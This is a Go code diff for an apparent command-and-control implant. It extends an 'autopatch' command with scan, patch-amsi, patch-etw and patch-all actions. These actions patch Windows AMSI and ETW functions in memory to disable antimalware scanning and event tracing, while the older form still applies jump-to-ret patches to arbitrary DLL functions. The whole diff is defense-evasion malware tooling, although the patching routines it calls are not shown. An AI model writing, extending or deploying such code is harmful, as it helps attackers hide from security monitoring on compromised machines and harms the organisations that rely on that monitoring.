@@ -31,6 +31,8 @@ type AutoPatchArgs struct {
 	DllName      string `json:"dll_name"`
 	FunctionName string `json:"function_name"`
 	NumBytes     int    `json:"num_bytes"`
+	Action       string `json:"action"`
+	Strategy     string `json:"strategy"`
 }
 
 // Execute executes the autopatch command
@@ -41,22 +43,90 @@ func (c *AutoPatchCommand) Execute(task structs.Task) structs.CommandResult {
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
 		// Try parsing as space-separated string
 		parts := strings.Fields(task.Params)
-		if len(parts) != 3 {
-			return errorResult("Error: Invalid arguments. Usage: autopatch <dll_name> <function_name> <num_bytes>")
-		}
-		args.DllName = parts[0]
-		args.FunctionName = parts[1]
-		if n, _ := fmt.Sscanf(parts[2], "%d", &args.NumBytes); n != 1 || args.NumBytes <= 0 {
-			return errorf("Error: num_bytes must be a positive integer, got %q", parts[2])
+		if len(parts) >= 1 {
+			// Check if first arg is an action keyword
+			switch parts[0] {
+			case "scan", "patch-amsi", "patch-etw", "patch-all":
+				args.Action = parts[0]
+				if len(parts) >= 2 {
+					args.Strategy = parts[1]
+				}
+			default:
+				// Legacy format: dll function num_bytes
+				if len(parts) != 3 {
+					return errorResult("Error: Invalid arguments. Usage: autopatch <scan|patch-amsi|patch-etw|patch-all> [strategy] OR autopatch <dll> <function> <num_bytes>")
+				}
+				args.DllName = parts[0]
+				args.FunctionName = parts[1]
+				if n, _ := fmt.Sscanf(parts[2], "%d", &args.NumBytes); n != 1 || args.NumBytes <= 0 {
+					return errorf("Error: num_bytes must be a positive integer, got %q", parts[2])
+				}
+			}
 		}
 	}
 
-	output, err := PerformAutoPatch(args.DllName, args.FunctionName, args.NumBytes)
+	// Handle new action-based interface
+	switch args.Action {
+	case "scan":
+		return autopatchScan()
+	case "patch-amsi":
+		return autopatchTarget("amsi", args.Strategy)
+	case "patch-etw":
+		return autopatchTarget("etw", args.Strategy)
+	case "patch-all":
+		return autopatchAll(args.Strategy)
+	case "":
+		// Legacy mode: direct DLL/function/numbytes
+		if args.DllName == "" {
+			return errorResult("Error: specify action (scan, patch-amsi, patch-etw, patch-all) or provide dll_name + function_name + num_bytes")
+		}
+		output, err := PerformAutoPatch(args.DllName, args.FunctionName, args.NumBytes)
+		if err != nil {
+			return errorResult(err.Error())
+		}
+		return successResult(output)
+	default:
+		return errorf("Unknown action: %s (use scan, patch-amsi, patch-etw, patch-all)", args.Action)
+	}
+}
+
+// autopatchScan scans known targets for patchability
+func autopatchScan() structs.CommandResult {
+	var results []patchScanResult
+	for _, target := range knownTargets {
+		results = append(results, ScanTarget(target))
+	}
+
+	output, _ := json.MarshalIndent(results, "", "  ")
+	return successResult(string(output))
+}
+
+// autopatchTarget patches a specific known target
+func autopatchTarget(targetName, strategy string) structs.CommandResult {
+	target, ok := knownTargets[targetName]
+	if !ok {
+		return errorf("Unknown target: %s", targetName)
+	}
+
+	output, err := PatchTarget(target, strategy)
 	if err != nil {
 		return errorResult(err.Error())
 	}
-
 	return successResult(output)
+}
+
+// autopatchAll patches all known targets
+func autopatchAll(strategy string) structs.CommandResult {
+	var results []string
+	for name, target := range knownTargets {
+		output, err := PatchTarget(target, strategy)
+		if err != nil {
+			results = append(results, fmt.Sprintf("[!] %s: %v", name, err))
+		} else {
+			results = append(results, output)
+		}
+	}
+	return successResult(strings.Join(results, "\n---\n"))
 }
 
 // PerformAutoPatch applies a jump-to-ret patch on the specified function.
